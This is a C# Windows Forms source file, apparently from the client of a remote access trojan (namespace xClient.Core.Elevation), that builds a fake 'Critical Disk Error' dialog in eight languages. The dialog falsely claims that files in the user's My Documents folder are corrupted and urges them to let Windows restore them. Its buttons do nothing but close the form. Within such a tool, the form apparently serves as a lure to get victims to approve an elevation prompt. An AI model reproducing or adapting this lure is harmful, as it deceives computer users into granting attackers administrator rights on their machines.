using System;
using System.Drawing;
using System.Windows.Forms;

namespace xClient.Core.Elevation
{
    public partial class FrmElevation : Form
    {
        public FrmElevation()
        {
            InitializeComponent();

            picError.Image = SystemIcons.Error.ToBitmap();
            SetLanguage();
        }

        private void FrmElevation_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.DrawLine(Pens.Gray, new Point(0, panelBot.Location.Y - 1),
                new Point(this.Width, panelBot.Location.Y - 1));
        }

        private void SetLanguage()
        {
            string CountryCode = System.Globalization.RegionInfo.CurrentRegion.TwoLetterISORegionName;
            //string CountryCode = "ES";
            switch (CountryCode)
            {
                case "PL": // by navaro21
                    this.Text = "Krytyczny błąd dysku";
                    lblHead.Text = "Plik lub lokalizacja została uszkodzona i jest niezdolna do odczytu.";
                    lblText.Text =
                        "Zostało znalezionych wiele uszkodzonych plików w lokalizacji 'Moje Dokumenty'. Aby\nzapobiec poważnej utraty danych pozwól systemowi Windows odzyskać te pliki.\n\n" +
                        "Uszkodzona lokalizacja: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                        "\n" +
                        "Liczba uszkodzonych plików: 4";
                    btnRestore.Text = "Odzyskaj pliki";
                    btnRestoreAndCheck.Text = "Odzyskaj pliki i sprawdź dysk w poszukiwaniu błędów.";
                    linkError.Text = "Więcej szczegółów o tym błędzie";
                    break;
                case "RU": // by GameFire
                    this.Text = "Критическая ошибка диска";
                    lblHead.Text = "Этот файл или каталог поврежден и нечитаемый";
                    lblText.Text =
                        "Несколько поврежденные файлы были найдены в каталоге 'Мои документы'. Для\nтогочтобы предотвратить потерю данных, пожалуйста позвольте Windows\nвосстановить эти файлы.\n\n" +
                        "Поврежденный каталог: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                        "\n" +
                        "Количество поврежденных файлов: 4";
                    btnRestore.Text = "Восстановление файлов";
                    btnRestoreAndCheck.Text = "Восстановить файлы и проверять диск для ошибок";
                    linkError.Text = "Подробнее об этой ошибке";
                    break;
                case "FI": // by Perfectionist & Qmz_
                    this.Text = "Kriittinen levyvirhe";
                    lblHead.Text = "Tiedosto tai hakemisto on vioittunut ja lukukelvoton";
                    lblText.Text =
                        "Useita vioittuineita tiedostoja on löytynyt kansiosta 'Omat tiedostot'. Ehkäistäksesi\nvakavan tietojen menetyksen, salli Windowsin palauttaa nämä tiedostot.\n\n" +
                        "Vioittunut kansio: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\n" +
                        "Korruptoituneiden tiedostojen määrä: 4";
                    btnRestore.Text = "Palauta tiedostot";
                    btnRestoreAndCheck.Text = "Palauta tiedostot ja aloita virheiden etsiminen";
                    linkError.Text = "Lisätietoja virheestä";
                    break;
                case "NL": // by DeadLine
                    this.Text = "Kritieke schrijffout";
                    lblHead.Text = "Het bestand of pad is corrupt of onleesbaar";
                    lblText.Text =
                        "Meerdere corrupte bestanden zijn gevonden in het pad 'Mijn Documenten'. Gelieve de\nbestanden door Windows te laten herstellen om dataverlies te voorkomen.\n\n" +
                        "Corrupt pad: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\n" +
                        "Aantal corrupte bestanden: 4";
                    btnRestore.Text = "Herstel bestanden";
                    btnRestoreAndCheck.Text = "Herstel bestanden en controleer op schijffouten";
                    linkError.Text = "Meer informatie over deze fout";
                    break;
                case "FR": // by Increment
                    this.Text = "Erreur Critique du Disque ";
                    lblHead.Text = "Le fichier ou le dossier spécifié est corrompu";
                    lblText.Text =
                        "De nombreux fichiers corrompus ont été trouvés dans le dossier 'Mes Documents'. Pour\néviter toute perte de donnée, veuillez autoriser Windows à restaurer vos fichiers et\ndonnées.\n\n" +
                        "Dossier corrompu : " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\n" +
                        "Nombre de fichier(s) corrompu(s) : 4";
                    btnRestore.Text = "Restaurer les fichiers";
                    btnRestoreAndCheck.Text = "Restaurer les fichiers et vérifier des érreurs sur le disque ";
                    linkError.Text = "En savoir plus à propos de cette erreurs";
                    break;
                case "ES": // by Xenocode
                    this.Text = "Error critico del disco duro";
                    lblHead.Text = "El archivo o directorio está dañado y no se puede leer";
                    lblText.Text =
                        "Algunos archivos dañados múltiples han sido encontrados en el directorio 'Mis Documentos'.\nPara prevenir la pérdida grave de datos, permita por favor de Windows para recuperar\nestos archivos.\n\n" +
                        "Directorio dañado : " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\n" +
                        "Archivos corrupots : 4";
                    btnRestore.Text = "Recuperar archivos";
                    btnRestoreAndCheck.Text = "Reparar archivos y comprobar si hay errores en el disco dur";
                    linkError.Text = "Detalles de Errores";
                    break;
                case "DE":
                    this.Text = "Kritischer Festplatten Fehler";
                    lblHead.Text = "Die Datei oder das Verzeichnis ist beschädigt und nicht lesbar";
                    lblText.Text =
                        "Es wurden mehrere beschädigte Dateien in dem Verzeichnis 'Meine Dokumente' gefunden.\nUm einen ernsthaften Datenverlust zu vermeiden, erlauben Sie bitte Windows, die Dateien\nwiederherzustellen.\n\n" +
                        "Beschädigtes Verzeichnis: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                        "\n" +
                        "Anzahl der beschädigten Dateien: 4";
                    btnRestore.Text = "Dateien wiederherstellen";
                    btnRestoreAndCheck.Text = "Dateien wiederherstellen und Festplatte auf Fehler überprüfen";
                    linkError.Text = "Mehr Informationen zu diesem Fehler";
                    break;
                default: // this includes GB, US and all other
                    this.Text = "Critical Disk Error";
                    lblHead.Text = "The file or directory is corrupted and unreadable";
                    lblText.Text =
                        "Multiple corrupted files have been found in the directory 'My Documents'. To prevent\nserious loss of data, please allow Windows to restore these files.\n\n" +
                        "Corrupted directory: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                        "\n" +
                        "Corrupted files count: 4";
                    btnRestore.Text = "Restore files";
                    btnRestoreAndCheck.Text = "Restore files and check disk for errors";
                    linkError.Text = "More details about this error";
                    break;
            }
        }

        private void btnRestore_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnRestoreAndCheck_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void linkError_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(
                "http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx");
        }
    }
}